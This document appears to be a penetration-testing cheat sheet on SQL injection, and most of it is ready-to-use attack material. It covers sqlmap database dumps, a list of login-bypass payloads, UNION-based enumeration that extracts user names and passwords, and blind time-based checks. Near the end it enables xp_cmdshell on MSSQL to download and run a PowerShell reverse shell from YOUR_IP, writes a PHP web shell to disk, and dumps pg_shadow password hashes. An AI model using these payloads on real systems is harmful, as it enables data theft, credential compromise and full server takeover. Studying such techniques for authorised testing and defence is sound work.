# SQL Injection

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

A successful SQL injection attack can result in unauthorized access to sensitive data, such as:

* Passwords.
* Credit card details.
* Personal user information.

Imagine a shopping application that displays products in different categories. When the user clicks on the **Gifts** category, their browser requests the URL:

`https://insecure-website.com/products?category=Gifts`

This causes the application to make a SQL query to retrieve details of the relevant products from the database:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`.

The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

`https://insecure-website.com/products?category=Gifts'--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

**Good tool:** [https://sqlmap.org/](https://sqlmap.org/)

You can capture the request using burp suite, and save the request in a file. Then your run:

`sqlmap -r request.txt`

We can dump the database and the table, i.e.:

`sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users`

**Manual login bypass**:

```
' or '1'='1
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

### Error-based SQLi

If we manage to find an error-message after a broken SQL query, we can use that to try to map out the database structure.

For example:

```
http://example.com/photoalbum.php?id=1
```

#### Step 1: Add a ' or '':

So first we should try to break the SQL syntax by adding a `'`. We should first ad a `'` or a `"`.

```
http://example.com/photoalbum.php?id=1'
```

If the page then returns a blank page or a page with a SQL error we know that the page it vulnerable.

#### Step 2: Enumerate columns:

So in order to enumerate the columns of a table we can use the **order by** statement.

**Order by 1** means sort by values of the first column from the result set. **Order by 2** means sort by values of the second column from the result set. So it is basically just a tool to order the data in a table. But we can use it to find out how many columns a table has. Because if we do **order by 10** when there really only is 9 columns SQL will throw an error. And we will know how many columns the table has.

```
# No error
http://example.com/photoalbum.php?id=1 order by 9

# Error
http://example.com/photoalbum.php?id=1 order by 10
```

To enumerate columns you can also use **union select** of **null** values, and if the number of null values provided in injection matches the number of columns in the database you should not receive an error:

```
# Example: Database has 3 columns
# No error
http://example.com/photoalbum.php?id=1' union select NULL,NULL,NULL--

# Error
http://example.com/photoalbum.php?id=1' union select NULL,NULL--
```

We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

Now in order to find out if we can output some data, we can start by replacing NULL values with some actual data. For example:

```
# Example: Database has 3 columns
# Replace one of the null values with string to see if the database responds without error
http://example.com/photoalbum.php?id=1' union select NULL,'A',NULL--
```

#### Step 3: Find space to output DB:

We need to know which columns are being outputted on the webpage. It could be that not all of the data from the database is worthwhile to output, so maybe only column 1 and 3 are being outputted to the website.

```
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,5,6,7,8,9
```

For all the columns that exists. This will return the numbers of the columns that are being outputted on the website. Take note of which these columns are.

#### Step 4: Start enumerating the database:

Now we can use that field to start outputting data. For example if column number five has been visible in step 3, we can use that to output the data.

Here is a list of data we can retrieve from the database. Some of the syntaxes may difference depending on the database engine (MySQL, MSSQL, Postgres):

```
# Get username of the SQL user
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9

# Get version
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,version(),6,7,8,9

# Get all tables
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

# Get all columns from a specific table
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'

# Get content from the users-table. From columns name and password. The 0x3a (:) only serves to create a delimitor between name and password
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users
```

### Blind SQL injection:

We say that it is blind because we do not have access to the error log.

#### Using sleep:

Since we do not have access to the logs we do not know if our commands are syntaxically correct or not. To know if it is correct or not we can however use the sleep statement.

```
http://example.com/photoalbum.php?id=1-sleep(4)
```

If the page loads for 4 extra seconds we know that the database is processing our **sleep()** command.

### MSSQL time-based SQLi to RCE:

If you manage to find SQLi on MSSQL backend, you can get RCE on it.

To check for MSSQL time-based SQLi use this command on vulnerable parameter:

<pre><code><strong>' WAITFOR DELAY '0:0:10' --
</strong></code></pre>

If you confirm it use the following commands to enable xp\_cmdshell and use it in combination with Powershell to get a shell back to you:

```
// First enable advanced options
EXECUTE sp_configure 'show advanced options', 1;

// Then reconfigure
RECONFIGURE;

// Then enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1;

// Reconfigure again
RECONFIGURE;
```

If all goes well, download nishang powershell invoker and add the following line at the end:\
[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

```
Invoke-PowerShellTcp -Reverse -IPAddress YOUR_IP -Port PORT
```

Host the invoker script on python server (python3 -m http.server) and make a request from the SQLi to it.

```
// SQLi payload
' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://YOUR_IP:PYTHON_LISTENER_PORT/Invoke-PowerShellTcp.ps1\")" '; --
```

**Don't forget to start the listener for reverse shell also, this one should listen on port you added in the line at the end of the invoker script (use a different port from the python server)!**

### Some example usages:

Write web-shell to server using SQLi union select (works for MySQL)

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

PostgreSQL dumping password in error-based SQLi

```
' UNION SELECT null,CAST(passwd AS INT),null,null,null,null from pg_shadow --
```
